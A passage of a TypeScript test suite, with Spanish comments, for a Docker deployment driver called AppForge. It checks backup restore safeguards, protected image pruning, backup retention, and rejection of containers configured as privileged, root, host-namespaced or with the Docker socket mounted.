    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(true);
    const n = stub.networks.get('appforge-apps')!;
    expect(n.internal).toBe(true);
    expect(n.labels['com.appforge.managed']).toBe('true');
    expect(n.labels['com.appforge.component']).toBe('network');
    const v = stub.volumes.get('appforge-data')!;
    expect(v['com.appforge.managed']).toBe('true');
    expect(v['com.appforge.component']).toBe('studio-data');
  });
});

describe('B6: restoreBackup endurecido', () => {
  const BACKUP_ID = 'bk_test_001';

  function restoreArgs() {
    return { projectId: PID, deploymentId: DID, candidateId: `cand-${DID.slice(0, 8)}`, backupId: BACKUP_ID } as never;
  }

  /** Crea un backup válido en disco y devuelve sus bytes. */
  function makeValidBackup(dataDir: string): { bdir: string; bytes: Buffer } {
    const bdir = backupDirFor(dataDir, PID, BACKUP_ID);
    fs.mkdirSync(bdir, { recursive: true });
    const dbPath = path.join(bdir, 'app.db');
    const sdb = new Database(dbPath);
    sdb.exec('CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT); INSERT INTO t(v) VALUES (\'hola\');');
    sdb.close();
    const { size, sha256 } = sha256File(dbPath);
    const manifest: BackupManifest = {
      backupId: BACKUP_ID,
      projectId: PID,
      deploymentId: DID,
      createdAt: new Date().toISOString(),
      hadDatabase: true,
      files: [{ name: 'app.db', size, sha256 }],
    };
    writeBackupManifest(bdir, manifest);
    return { bdir, bytes: fs.readFileSync(dbPath) };
  }

  async function setupBuilt(dataDir: string, db: Database.Database, stub: StubDocker) {
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    return d;
  }

  test('backup corrupto → rechazado ANTES de tocar el live', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes } = makeValidBackup(dataDir);
    // Corromper el fichero en disco tras escribir el manifiesto.
    fs.appendFileSync(path.join(backupDirFor(dataDir, PID, BACKUP_ID), 'app.db'), 'corrupto');
    stub.hostFiles.set('app.db', bytes);
    // El live existe con datos (simulado).
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.role': 'live',
    });
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_FILE_CORRUPT/);
    // El live NO se tocó: ni stop, ni rm de contenedor, ni rm del volumen.
    expect(stub.volumes.has(liveVolume)).toBe(true);
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm')).toBe(false);
    expect(stub.calls.some((c) => c[0] === 'stop' || c[0] === 'kill')).toBe(false);
  });

  test('volumen live ajeno sobrevive a restoreBackup', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes } = makeValidBackup(dataDir);
    stub.hostFiles.set('app.db', bytes);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, { 'otra': 'etiqueta' }); // ajeno
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/FOREIGN_RESOURCE/);
    expect(stub.volumes.get(liveVolume)).toEqual({ 'otra': 'etiqueta' });
  });

  test('manifiesto con projectId distinto → rechazado sin tocar nada', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    makeValidBackup(dataDir);
    const liveVolume = projectLiveVolumeName(PID);
    stub.volumes.set(liveVolume, {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.role': 'live',
    });
    // Reescribir el manifiesto con otro projectId.
    const bdir = backupDirFor(dataDir, PID, BACKUP_ID);
    const m = JSON.parse(fs.readFileSync(path.join(bdir, 'backup.json'), 'utf8')) as BackupManifest;
    m.projectId = '22222222-3333-4444-8555-666666666666';
    writeBackupManifest(bdir, m);
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/BACKUP_PROJECT_MISMATCH/);
    expect(stub.volumes.has(liveVolume)).toBe(true);
    expect(stub.calls.some((c) => c[0] === 'volume' && c[1] === 'rm')).toBe(false);
  });

  test('restauración válida: staging → swap → verificación, staging limpiado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const stub = new StubDocker();
    const d = await setupBuilt(dataDir, db, stub);
    const { bytes } = makeValidBackup(dataDir);
    stub.hostFiles.set('app.db', bytes);
    const liveVolume = projectLiveVolumeName(PID);
    const r = await d.restoreBackup(restoreArgs());
    expect(r.ok).toBe(true);
    // El volumen live existe con labels estables.
    const labels = stub.volumes.get(liveVolume)!;
    expect(labels['com.appforge.managed']).toBe('true');
    expect(labels['com.appforge.project-id']).toBe(PID);
    expect(labels['com.appforge.role']).toBe('live');
    // El staging se limpió.
    expect([...stub.volumes.keys()].some((n) => n.startsWith('appforge-restore-staging-'))).toBe(false);
  });
});

describe('B7: pruneManagedImages con scope y protegidos', () => {
  const FP = 'a'.repeat(64);
  const ref = (d8: string, sha12: string) => `appforge/app-${PID.slice(0, 8)}:dep-${d8}-${sha12}`;
  const managedLabels = (depId: string, withFp = true): Record<string, string> => ({
    'com.appforge.managed': 'true',
    'com.appforge.project-id': PID,
    'com.appforge.deployment-id': depId,
    'com.appforge.role': 'live',
    ...(withFp ? { 'com.appforge.source-fingerprint': FP } : {}),
  });

  async function setupPrune() {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    db.exec('CREATE TABLE IF NOT EXISTS project_runtime(project_id TEXT PRIMARY KEY, live_image TEXT, previous_image TEXT)');
    const stub = new StubDocker();
    const liveRef = ref(DID.slice(0, 8), FP.slice(0, 12));
    const oldRef = ref(DID2.slice(0, 8), FP.slice(0, 12));
    const otherRef = `appforge/app-99999999:dep-88888888-${FP.slice(0, 12)}`;
    const incompleteRef = ref('77777777', FP.slice(0, 12));
    const mkImg = (ref: string, id: string, labels: Record<string, string>): StubImage => ({
      id,
      repo: ref.split(':')[0]!,
      tag: ref.split(':')[1]!,
      labels,
      os: 'linux',
      arch: 'amd64',
      user: '1001',
    });
    const liveImg = mkImg(liveRef, 'sha256:' + '1'.repeat(64), managedLabels(DID));
    const oldImg = mkImg(oldRef, 'sha256:' + '2'.repeat(64), managedLabels(DID2));
    const otherImg = mkImg(otherRef, 'sha256:' + '3'.repeat(64), { ...managedLabels(DID2), 'com.appforge.project-id': '99999999-0000-4000-8000-000000000000' });
    const incompleteImg = mkImg(incompleteRef, 'sha256:' + '4'.repeat(64), managedLabels('77777777', false));
    for (const img of [liveImg, oldImg, otherImg, incompleteImg]) {
      // Registrar por ref y por id (la re-inspección usa el id).
      stub.images.set(`${img.repo}:${img.tag}`, img);
      stub.images.set(img.id, img);
    }
    db.prepare('INSERT INTO project_runtime(project_id, live_image, previous_image) VALUES (?,?,?)').run(PID, liveRef, oldRef);
    const d = makeDriver(dataDir, db, stub);
    return { d, stub, liveRef, oldRef, otherRef, incompleteRef };
  }

  test('protege live_image/previous_image, poda la antigua sin proteger, no toca otros proyectos', async () => {
    const { d, stub, liveRef, oldRef, otherRef, incompleteRef } = await setupPrune();
    // oldRef está protegida como previous_image: la desprotegemos para este caso.
    const db2 = (d as unknown as { db: Database.Database }).db;
    db2.prepare('UPDATE project_runtime SET previous_image=NULL WHERE project_id=?').run(PID);
    const { removed, failures } = await d.pruneManagedImages(PID);
    expect(removed).toContain(oldRef);
    expect(removed).not.toContain(liveRef);
    expect(removed).not.toContain(otherRef);
    expect(removed).not.toContain(incompleteRef);
    expect(stub.images.has(otherRef)).toBe(true); // otro proyecto intacto
    expect(failures.some((f) => f.includes('incomplete labels'))).toBe(true);
  });

  test('imágenes protegidas sobreviven a la poda: live_image y previous_image nunca se podan', async () => {
    const { d, stub, liveRef, oldRef } = await setupPrune();
    const { removed } = await d.pruneManagedImages(PID);
    expect(removed).not.toContain(liveRef);
    expect(removed).not.toContain(oldRef);
    expect(stub.images.has(liveRef)).toBe(true);
    expect(stub.images.has(oldRef)).toBe(true);
  });

  test('re-inspección exacta antes del rmi: labels cambiadas → no se elimina', async () => {
    const { d, stub, oldRef } = await setupPrune();
    const db2 = (d as unknown as { db: Database.Database }).db;
    db2.prepare('UPDATE project_runtime SET previous_image=NULL WHERE project_id=?').run(PID);
    // Simular que las labels cambiaron entre el listado y la re-inspección:
    // el inspect devuelve labels distintas a las listadas.
    const img = stub.images.get(oldRef)!;
    stub.inspectLabelOverride.set(img.id, { ...img.labels, 'com.appforge.source-fingerprint': 'b'.repeat(64) });
    const { removed, failures } = await d.pruneManagedImages(PID);
    expect(removed).not.toContain(oldRef);
    expect(failures.some((f) => f.includes('label re-inspection failed'))).toBe(true);
    expect(stub.images.has(oldRef)).toBe(true);
  });
});

describe('discardCandidate: imagen ajena con el nombre esperado', () => {
  test('no elimina una imagen ajena aunque el nombre coincida', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    // Sustituir la imagen por una ajena con el MISMO nombre pero labels distintas.
    const fp = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const imgRef = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp.slice(0, 12)}`;
    const foreign = stub.images.get(imgRef)!;
    foreign.labels = { 'com.appforge.managed': 'true', 'com.appforge.project-id': PID, 'com.appforge.deployment-id': 'otro', 'com.appforge.role': 'live', 'com.appforge.source-fingerprint': fp };
    const r = await d.discardCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/FOREIGN_RESOURCE/);
    expect(stub.images.has(imgRef)).toBe(true); // la ajena sobrevive
    expect(stub.calls.some((c) => c[0] === 'rmi')).toBe(false);
  });
});

describe('B8: validación posterior completa vía docker inspect', () => {
  const LIVE = `appforge-app-${PID.slice(0, 8)}`;

  function goodInspect(liveVolume: string, labels: Record<string, string>, imageRef: string) {
    return {
      Config: { Labels: labels, User: '1001', Image: imageRef },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    };
  }

  async function startWith(overrides: (insp: Record<string, unknown>, ctx: { imgRef: string; stub: StubDocker }) => void) {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const fp = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const imgRef = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp.slice(0, 12)}`;
    const liveVolume = projectLiveVolumeName(PID);
    const insp = goodInspect(liveVolume, {
      'com.appforge.managed': 'true',
      'com.appforge.project-id': PID,
      'com.appforge.deployment-id': DID,
      'com.appforge.role': 'live',
      'com.appforge.source-fingerprint': fp,
    }, imgRef) as unknown as Record<string, unknown>;
    overrides(insp, { imgRef, stub });
    stub.containerTemplate = insp;
    const r = await d.startCandidateAsLive(opArgs(PID, DID));
    return { r, stub };
  }

  test('contenedor conforme → ok', async () => {
    const { r } = await startWith(() => {});
    expect(r.ok).toBe(true);
  });

  test('privileged=true → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).Privileged = true;
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_PRIVILEGED/);
  });

  test('usuario root → rechazado (se exige 1001 exacto)', async () => {
    const { r } = await startWith((insp) => {
      (insp.Config as Record<string, unknown>).User = '0';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_USER_MISMATCH/);
  });

  test('montaje del socket de docker → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.Mounts as unknown[]).push({ Type: 'bind', Source: '/var/run/docker.sock', Destination: '/var/run/docker.sock' });
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_(SOCKET_MOUNT|MOUNT_UNEXPECTED)/);
  });

  test('montaje del volumen del Studio → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.Mounts as unknown[]).push({ Type: 'volume', Name: 'appforge-data', Source: 'appforge-data', Destination: '/studio' });
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_(STUDIO_VOLUME_MOUNT|MOUNT_UNEXPECTED)/);
  });

  test('arquitectura no soportada → rechazado', async () => {
    const { r } = await startWith((_insp, { imgRef, stub }) => {
      stub.images.get(imgRef)!.arch = 'riscv64';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/IMAGE_ARCH_MISMATCH/);
  });

  test('MemorySwap sin tope → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).MemorySwap = 0;
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_SWAP_MISMATCH/);
  });

  test('sin tmpfs en /tmp → rechazado', async () => {
    const { r } = await startWith((insp) => {
      insp.Mounts = (insp.Mounts as unknown[]).filter((m) => (m as { Destination: string }).Destination !== '/tmp');
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_TMPFS_MISMATCH/);
  });

  test('tmpfs solo en HostConfig.Tmpfs (otra versión de Docker) → ok', async () => {
    const { r } = await startWith((insp) => {
      // Algunas versiones de Docker no listan el tmpfs en Mounts.
      insp.Mounts = (insp.Mounts as unknown[]).filter((m) => (m as { Destination: string }).Destination !== '/tmp');
      (insp.HostConfig as Record<string, unknown>).Tmpfs = { '/tmp': 'rw,noexec,nosuid,size=64m' };
    });
    expect(r.ok).toBe(true);
  });

  test('mount no-tmpfs en /tmp aunque haya flag → rechazado', async () => {
    const { r } = await startWith((insp) => {
      insp.Mounts = [
        (insp.Mounts as unknown[])[0], // /data intacto
        { Type: 'volume', Name: 'sospechoso', Source: 'sospechoso', Destination: '/tmp' },
      ];
      (insp.HostConfig as Record<string, unknown>).Tmpfs = { '/tmp': 'rw,noexec,nosuid,size=64m' };
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_TMPFS_MISMATCH/);
  });

  test('PidMode=host → rechazado (solo valores exactos permitidos)', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).PidMode = 'host';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_PID_MODE/);
  });

  test('PidMode no permitido (container:otro) → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).PidMode = 'container:otro';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_PID_MODE/);
  });

  test('IpcMode=host → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).IpcMode = 'host';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_IPC_MODE/);
  });

  test('IpcMode no permitido (shareable) → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).IpcMode = 'shareable';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_IPC_MODE/);
  });

  test('Devices ausente → rechazado (debe estar explícitamente vacío)', async () => {
    const { r } = await startWith((insp) => {
      delete (insp.HostConfig as Record<string, unknown>).Devices;
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_DEVICES/);
  });

  test('Devices no vacío → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).Devices = [{ PathOnHost: '/dev/sda', PathInContainer: '/dev/xvda' }];
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_DEVICES/);
  });

  test('red adicional (bridge) → rechazado: exactamente una red', async () => {
    const { r } = await startWith((insp) => {
      (insp.NetworkSettings as Record<string, unknown>).Networks = { 'appforge-apps': {}, 'bridge': {} };
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_NETWORK_MISMATCH/);
  });

  test('sin redes → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.NetworkSettings as Record<string, unknown>).Networks = {};
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_NETWORK_MISMATCH/);
  });

  test('arquitectura de imagen distinta a la del daemon → rechazado', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    stub.daemonArch = 'aarch64'; // daemon arm64, imagen amd64
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const fp = (db.prepare('SELECT snapshot_fingerprint AS f FROM deployments WHERE id=?').get(DID) as { f: string }).f;
    const imgRef = `appforge/app-${PID.slice(0, 8)}:dep-${DID.slice(0, 8)}-${fp.slice(0, 12)}`;
    const liveVolume = projectLiveVolumeName(PID);
    stub.containerTemplate = {
      Config: {
        Labels: {
          'com.appforge.managed': 'true',
          'com.appforge.project-id': PID,
          'com.appforge.deployment-id': DID,
          'com.appforge.role': 'live',
          'com.appforge.source-fingerprint': fp,
        },
        User: '1001',
        Image: imgRef,
      },
      State: { Running: true },
      Mounts: [
        { Type: 'volume', Name: liveVolume, Source: liveVolume, Destination: '/data' },
        { Type: 'tmpfs', Destination: '/tmp' },
      ],
      NetworkSettings: { Networks: { 'appforge-apps': {} }, Ports: {} },
      HostConfig: {
        Memory: 512 * 1024 * 1024,
        MemorySwap: 512 * 1024 * 1024,
        NanoCpus: 1_000_000_000,
        PidsLimit: 128,
        CapDrop: ['ALL'],
        SecurityOpt: ['no-new-privileges'],
        ReadonlyRootfs: true,
        Privileged: false,
        Devices: [],
        PidMode: '',
        IpcMode: 'private',
        NetworkMode: 'appforge-apps',
        RestartPolicy: { Name: 'unless-stopped' },
      },
    };
    const r = await d.startCandidateAsLive(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/IMAGE_ARCH_MISMATCH/);
  });

  test('NetworkMode distinto → rechazado', async () => {
    const { r } = await startWith((insp) => {
      (insp.HostConfig as Record<string, unknown>).NetworkMode = 'bridge';
    });
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/CONTAINER_NETWORKMODE_MISMATCH/);
  });
});

describe('NO-GO2 B6: verified_source_fingerprint fail closed en reuseSnapshot', () => {
  async function setupPersisted() {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id) VALUES (?)').run(DID);
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    return { dataDir, db, stub, d };
  }

  test.each([
    ['NULL', null],
    ['vacío', ''],
    ['malformado (no hex)', 'xyz-no-es-un-fingerprint'],
    ['malformado (63 chars)', 'a'.repeat(63)],
    ['malformado (65 chars)', 'a'.repeat(65)],
  ])('fingerprint %s → rechazado (SNAPSHOT_SOURCE_FP_INVALID)', async (_label, bad) => {
    const { db, d } = await setupPersisted();
    db.prepare('UPDATE deployments SET verified_source_fingerprint=? WHERE id=?').run(bad, DID);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/SNAPSHOT_SOURCE_FP_INVALID/);
  });

  test('fingerprint distinto (bien formado) → SNAPSHOT_SOURCE_MISMATCH', async () => {
    const { db, d } = await setupPersisted();
    db.prepare('UPDATE deployments SET verified_source_fingerprint=? WHERE id=?').run('b'.repeat(64), DID);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(false);
    expect(r.code).toMatch(/SNAPSHOT_SOURCE_MISMATCH/);
  });

  test('fingerprint válido e igual (distinto case) → reutilización ok', async () => {
    const { db, d } = await setupPersisted();
    const row = db
      .prepare('SELECT verified_source_fingerprint AS f FROM deployments WHERE id=?')
      .get(DID) as { f: string };
    db.prepare('UPDATE deployments SET verified_source_fingerprint=? WHERE id=?').run(row.f.toUpperCase(), DID);
    const r = await d.buildCandidate(opArgs(PID, DID));
    expect(r.ok).toBe(true);
  });
});

describe('NO-GO2 B5: normalización de arquitectura', () => {
  test('normalizeArch mapea x86_64→amd64 y aarch64→arm64', async () => {
    const { normalizeArch } = await import('./dockerDriver.js');
    expect(normalizeArch('x86_64')).toBe('amd64');
    expect(normalizeArch('aarch64')).toBe('arm64');
    expect(normalizeArch('amd64')).toBe('amd64');
    expect(normalizeArch('arm64')).toBe('arm64');
    expect(normalizeArch('X86_64\n')).toBe('amd64');
    expect(normalizeArch('riscv64')).toBe('riscv64');
  });

  test.skipIf(process.platform === 'win32')('preflight informa la arquitectura del daemon en el diagnóstico', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const stub = new StubDocker();
    stub.daemonArch = 'aarch64';
    const sock = path.join(dataDir, 'docker.sock');
    const server = net.createServer();
    await new Promise<void>((res) => server.listen(sock, () => res()));
    const cfg = { ...resolveDockerDriverConfig(BASE_ENV, dataDir)!, socketPath: sock };
    const r = await preflightDocker(stub.asRunner(), cfg);
    server.close();
    expect(r.ok).toBe(true);
    expect(r.diagnostics.join(' ')).toMatch(/daemon architecture: arm64/);
  });
});

describe('NO-GO2 B1: retención real de backups con protegidos desde SQLite', () => {
  const LIVE = `appforge-app-${PID.slice(0, 8)}`;

  /** Live en marcha con labels válidas para que createLiveBackup copie de verdad. */
  function seedLiveContainer(stub: StubDocker) {
    stub.containers.set(LIVE, {
      Config: {
        Labels: {
          'com.appforge.managed': 'true',
          'com.appforge.project-id': PID,
          'com.appforge.role': 'live',
        },
        User: '1001',
        Image: 'appforge/app-11111111:dep-aaaaaaaa-000000000000',
      },
      State: { Running: true },
    });
  }

  /** Bytes de una SQLite real (quick_check debe pasar). */
  function realDbBytes(): Buffer {
    const p = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'af-db-')), 'app.db');
    const sdb = new Database(p);
    sdb.exec('CREATE TABLE t(id INTEGER PRIMARY KEY, v TEXT); INSERT INTO t(v) VALUES (\'x\');');
    sdb.close();
    return fs.readFileSync(p);
  }

  async function setupWithBackups(backupCount: number) {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'af-reg-'));
    const db = openDb();
    const projectDir = makeProjectDir(dataDir, PID);
    recordAllReceipts(db, PID, projectDir);
    db.prepare('INSERT INTO deployments(id, project_id, status) VALUES (?,?,?)').run(DID, PID, 'building');
    const stub = new StubDocker();
    const d = makeDriver(dataDir, db, stub);
    expect((await d.buildCandidate(opArgs(PID, DID))).ok).toBe(true);
    const ids: string[] = [];
    for (let i = 0; i < backupCount; i++) {
      const id = `bk_old_${String(i).padStart(2, '0')}`;
      ids.push(id);
      const bdir = backupDirFor(dataDir, PID, id);
      const manifest: BackupManifest = {
        backupId: id,
        projectId: PID,
        deploymentId: DID,
        createdAt: new Date().toISOString(),
        hadDatabase: false,
        files: [],
      };
      writeBackupManifest(bdir, manifest);
      // mtime escalonado: bk_old_00 el más antiguo.
      const t = new Date(Date.now() - (backupCount - i) * 3_600_000);
      fs.utimesSync(path.join(bdir, 'backup.json'), t, t);
    }
    seedLiveContainer(stub);
    stub.hostFiles.set('app.db', realDbBytes());
    return { dataDir, db, stub, d, ids };
  }

  test('protegidos sobreviven (deployment activo + último live); el antiguo no protegido se elimina', async () => {
    const { dataDir, db, stub, d, ids } = await setupWithBackups(12);
    // bk_old_00 protegido por un deployment activo; bk_old_01 por el último live.
    db.prepare('INSERT INTO deployments(id, project_id, status, backup_id) VALUES (?,?,?,?)').run(
      DID2, PID, 'promoting', ids[0],
    );
    db.prepare(
      "INSERT INTO deployments(id, project_id, status, backup_id, finished_at) VALUES (?,?,?,?,datetime('now'))",
    ).run('bbbbbbbb-cccc-4ddd-8eee-ffffffffffff', PID, 'live', ids[1]);
    const r = await d.createLiveBackup({ projectId: PID, deploymentId: DID, candidateId: `cand-${DID.slice(0, 8)}`, previousLiveVersion: null } as never);
    expect(r.ok).toBe(true);
    expect(r.data?.backupValidated).toBe('true');
    const exists = (id: string) => fs.existsSync(path.join(dataDir, 'project-backups', PID, id));
    // Protegidos: sobreviven aunque sean los más antiguos.
    expect(exists(ids[0])).toBe(true);
    expect(exists(ids[1])).toBe(true);
    // Antiguo no protegido más allá de keep=10: eliminado.
    expect(exists(ids[2])).toBe(false);
    // Los 9 más recientes + el nuevo backup: conservados.
    for (const id of ids.slice(3)) expect(exists(id)).toBe(true);
    const created = (r.data as Record<string, string>).backupId;
    expect(exists(created)).toBe(true);
    const m = JSON.parse(
      fs.readFileSync(path.join(dataDir, 'project-backups', PID, created, 'backup.json'), 'utf8'),
    ) as BackupManifest;
    expect(m.hadDatabase).toBe(true);
    expect(m.files.map((f) => f.name)).toContain('app.db');
    expect(r.data?.createdAt).toBe(m.createdAt);
    expect(r.data?.hadDatabase).toBe('true');
    expect(Number(r.data?.sizeBytes)).toBe(m.files.reduce((total, file) => total + file.size, 0));
    expect(stub.calls.some((c) => c[0] === 'stop')).toBe(true); // el live se detuvo para copiar
  });

  test('sin filas en deployments: la retención conserva las 10 recientes sin protegidos', async () => {
    const { dataDir, d, ids } = await setupWithBackups(12);
    const r = await d.createLiveBackup({ projectId: PID, deploymentId: DID, candidateId: `cand-${DID.slice(0, 8)}`, previousLiveVersion: null } as never);
    expect(r.ok).toBe(true);
    const exists = (id: string) => fs.existsSync(path.join(dataDir, 'project-backups', PID, id));
    // 12 antiguos + 1 nuevo = 13; keep=10 → se eliminan los 3 más antiguos.
    expect(exists(ids[0])).toBe(false);
    expect(exists(ids[1])).toBe(false);
    expect(exists(ids[2])).toBe(false);
    for (const id of ids.slice(3)) expect(exists(id)).toBe(true);
  });

  test('backup_id con formato inválido en deployments no rompe la retención', async () => {
    const { dataDir, db, d, ids } = await setupWithBackups(12);
    db.prepare('INSERT INTO deployments(id, project_id, status, backup_id) VALUES (?,?,?,?)').run(
      DID2, PID, 'promoting', 'no-es-un-backup-id',
    );
    const r = await d.createLiveBackup({ projectId: PID, deploymentId: DID, candidateId: `cand-${DID.slice(0, 8)}`, previousLiveVersion: null } as never);
    expect(r.ok).toBe(true);
    const exists = (id: string) => fs.existsSync(path.join(dataDir, 'project-backups', PID, id));
    expect(exists(ids[0])).toBe(false); // no protegido: se elimina por antigüedad
  });

  test('fallo al leer el estado protegido → retención fail closed, ningún backup antiguo se elimina', async () => {
    const { dataDir, db, d, ids } = await setupWithBackups(12);
    db.exec('ALTER TABLE deployments RENAME COLUMN backup_id TO backup_id_unavailable');
    expect(() => (
      d as unknown as { protectedBackupIds: (projectId: string) => Set<string> }
    ).protectedBackupIds(PID)).toThrow(/retention skipped/);
    const exists = (id: string) => fs.existsSync(path.join(dataDir, 'project-backups', PID, id));
    for (const id of ids) expect(exists(id)).toBe(true);
  });
});

describe('NO-GO2 B4: identidad de previousLiveVersion antes de ejecutar', () => {
  const FP = 'c'.repeat(64);
  const PREV_DID = 'cccccccc-dddd-4eee-8fff-000000000000';
  const PREV_REF = `appforge/app-${PID.slice(0, 8)}:dep-${PREV_DID.slice(0, 8)}-${FP.slice(0, 12)}`;
  const LIVE = `appforge-app-${PID.slice(0, 8)}`;

  const goodLabels = (): Record<string, string> => ({
    'com.appforge.managed': 'true',
    'com.appforge.project-id': PID,
    'com.appforge.deployment-id': PREV_DID,
    'com.appforge.role': 'live',
    'com.appforge.source-fingerprint': FP,
  });

  function seedPrevImage(stub: StubDocker, labels: Record<string, string>) {
    const id = 'sha256:' + '9'.repeat(64);
    const [repo, tag] = PREV_REF.split(':') as [string, string];
    const img = { id, repo, tag, labels, os: 'linux', arch: 'amd64', user: '1001' };
    stub.images.set(PREV_REF, img);
    stub.images.set(id, img);
  }

  function liveInspect(labels: Record<string, string>, liveVolume: string) {
    return {
